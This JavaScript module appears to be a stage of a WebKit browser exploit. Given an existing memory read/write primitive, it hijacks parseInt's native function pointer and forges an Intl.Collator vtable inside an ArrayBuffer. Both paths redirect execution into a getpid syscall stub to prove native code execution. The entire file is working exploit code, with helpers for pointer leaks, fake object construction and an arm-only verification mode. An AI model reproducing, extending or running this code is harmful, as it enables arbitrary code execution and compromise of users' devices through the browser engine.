/**
 * Novel native entry — NO G0-G5 slab, NO expm1 ROP pivot chain.
 *
 * Path A: stub-swap — write lk+getpid stub into parseInt m_function, call parseInt(ta), restore.
 * Path B: collator-stub — fake Intl.Collator vtable → lk+getpid stub, one compare() fire.
 *
 * Uses slopkit-core primitive + carrier.textarea @ READ-PRIMITIVE-PASS.
 */
import { int64 } from "./int64.js";

const COLLATOR_OFF = 0x18;
const ARENA_BYTES = 0x1000;
const FAKE_UC = 0x100;
const FAKE_VT = 0x300;
const MARK_OFF = 0xf00;

function codeLooksNative(code4) {
    return code4 != null && code4 !== 0 && code4 !== 0xffffffff && code4 !== 0xcccccccc;
}

function read4p(p, addr) {
    try {
        const v = p.read4(addr);
        if (v == null) return null;
        return (v.low >>> 0) | ((v.hi >>> 0) * 0x100000000);
    } catch (_) {
        return null;
    }
}

function putLow48(view, off, ptr) {
    const lo = ptr.low >>> 0;
    const hi = ptr.hi >>> 0;
    view[off] = lo & 0xff;
    view[off + 1] = (lo >>> 8) & 0xff;
    view[off + 2] = (lo >>> 16) & 0xff;
    view[off + 3] = (lo >>> 24) & 0xff;
    view[off + 4] = hi & 0xff;
    view[off + 5] = (hi >>> 8) & 0xff;
    view[off + 6] = 0;
    view[off + 7] = 0;
}

/** parseInt JSFunction → NativeExecutable m_function slot (same walk as poops, zero slab). */
export function captureParseIntMainMf(p, off) {
    const mOff = off.wk_JSFunction_m_function || 0x28;
    const cell = p.leakval(parseInt);
    const jfn = p.read8(cell.add32(0x18));
    if (!jfn) throw new Error("stub: no exec @ parseInt+0x18");
    const mainMf = jfn.add32(mOff);
    const mainOrig = p.read8(mainMf);
    if (!mainOrig) throw new Error("stub: mainOrig read failed");
    const probe = read4p(p, mainOrig);
    if (!codeLooksNative(probe))
        throw new Error("stub: mainOrig not code probe=0x" + (probe != null ? probe.toString(16) : "null"));
    return { cell, jfn, mainMf, mainOrig, nativeFn: mainOrig };
}

export function resolveGetpidStub(lk, off, prefer) {
    if (!lk || !off) throw new Error("stub: need lk+off");
    if (prefer === "syscall" && off.k_getpid_syscall != null)
        return { addr: lk.add32(off.k_getpid_syscall), tag: "lk+0x" + off.k_getpid_syscall.toString(16) + " (syscall)" };
    if (off.k_stubs && off.k_stubs[20] != null)
        return { addr: lk.add32(off.k_stubs[20]), tag: "lk+stub20 0x" + off.k_stubs[20].toString(16) };
    if (off.k_getpid_syscall != null)
        return { addr: lk.add32(off.k_getpid_syscall), tag: "lk+0x" + off.k_getpid_syscall.toString(16) };
    throw new Error("stub: no getpid offset in table");
}

/**
 * Path A — direct m_function stub swap. No gadgets, no pivot hook, no ArrayBuffer slab.
 * Returns JS-visible result from parseInt (may not equal pid — survival = win for bisect).
 */
export function fireStubSwapParseInt(p, off, lk, opts) {
    opts = opts || {};
    const carrier = opts.carrier || (typeof window !== "undefined" ? window._wkCarrier : null);
    const cap = captureParseIntMainMf(p, off);
    const stub = resolveGetpidStub(lk, off, opts.stubKind);
    const trigger = parseInt;
    let fireArg;
    if (opts.arg !== undefined) fireArg = opts.arg;
    else if (carrier && carrier.textarea) fireArg = carrier.textarea;
    else fireArg = 1;

    p.write8(cap.mainMf, stub.addr);
    let result = NaN;
    let err = null;
    try {
        result = trigger(fireArg);
    } catch (e) {
        err = e;
    } finally {
        try { p.write8(cap.mainMf, cap.mainOrig); } catch (_) { }
    }
    if (err) throw err;
    return {
        path: "stub-swap-parseInt",
        stub: stub.addr,
        stubTag: stub.tag,
        mainMf: cap.mainMf,
        mainOrig: cap.mainOrig,
        fireArg: fireArg === carrier && carrier && carrier.textarea ? "textarea" : fireArg,
        result,
    };
}

function arenaBacking(p, view) {
    const cell = p.leakval(view);
    const ptr = p.read8(cell.add32(0x10));
    if (!ptr || ptr.hi < 0x80 || ptr.hi > 0x8f) return null;
    if (p.read1(ptr.add32(MARK_OFF)) !== 0x52) return null;
    return ptr;
}

/**
 * Path B — Collator compare enters fake vtable → getpid stub directly (no gd trampoline, no ROP).
 */
export function pinCollatorStub(retain) {
    retain = retain || [];
    const collator = new Intl.Collator("en", { usage: "search" });
    const compareFn = collator.compare;
    if (!(compareFn("a", "b") < 0)) throw new Error("collator stub: compare broken");
    const ab = new ArrayBuffer(ARENA_BYTES);
    const view = new Uint8Array(ab);
    view[MARK_OFF] = 0x52;
    view[MARK_OFF + 1] = 0x4f;
    view[MARK_OFF + 2] = 0x50;
    view[MARK_OFF + 3] = 0x31;
    const compareArg = "\x00";
    retain.push(collator, compareFn, ab, view, compareArg);
    const collCell = p => p.leakval(collator);
    return {
        collator,
        compareFn,
        compareArg,
        view,
        ab,
        collCell,
        arenaBacking: function (p) { return arenaBacking(p, view); },
        buildFake: function (p) {
            const backing = arenaBacking(p, view);
            if (!backing) throw new Error("collator stub: arena fail");
            const fakeUC = backing.add32(FAKE_UC);
            const fakeVT = backing.add32(FAKE_VT);
            putLow48(view, FAKE_UC, fakeVT);
            for (let i = 0x48; i < 0x50; i++) view[FAKE_UC + i] = 0;
            for (let i = 0x60; i < 0x68; i++) view[FAKE_UC + i] = 0;
            return {
                backing,
                fakeUC,
                fakeVT,
                field: p.leakval(collator).add32(COLLATOR_OFF),
            };
        },
    };
}

export function fireCollatorStub(p, pin, lk, off, opts) {
    opts = opts || {};
    if (!pin || !pin.compareFn) throw new Error("collator stub: pin first");
    const stub = resolveGetpidStub(lk, off, opts.stubKind);
    const fake = pin.buildFake(p);
    putLow48(pin.view, FAKE_VT + 0x128, stub.addr);
    putLow48(pin.view, FAKE_UC + 0xe0, stub.addr);
    const pre = pin.compareFn(pin.compareArg, "b");
    if (!Number.isFinite(pre)) throw new Error("collator stub: prewarm fail pre=" + pre);
    const orig = p.read8(fake.field);
    p.write8(fake.field, fake.fakeUC);
    let result = NaN;
    let err = null;
    try {
        result = pin.compareFn(pin.compareArg, "b");
    } catch (e) {
        err = e;
    } finally {
        try { p.write8(fake.field, orig); } catch (_) { }
    }
    if (err) throw err;
    return {
        path: "collator-stub-direct",
        stub: stub.addr,
        stubTag: stub.tag,
        pre,
        result,
        fakeUC: fake.fakeUC,
    };
}

/** Bisect: arm stub only, no fire — verify write sticks on mainMf. */
export function verifyStubSwapArm(p, off, lk, opts) {
    const cap = captureParseIntMainMf(p, off);
    const stub = resolveGetpidStub(lk, off, opts && opts.stubKind);
    p.write8(cap.mainMf, stub.addr);
    const got = p.read8(cap.mainMf);
    p.write8(cap.mainMf, cap.mainOrig);
    const ok = got && String(got) === String(stub.addr);
    return { ok, mainMf: cap.mainMf, want: stub.addr, got, mainOrig: cap.mainOrig };
}
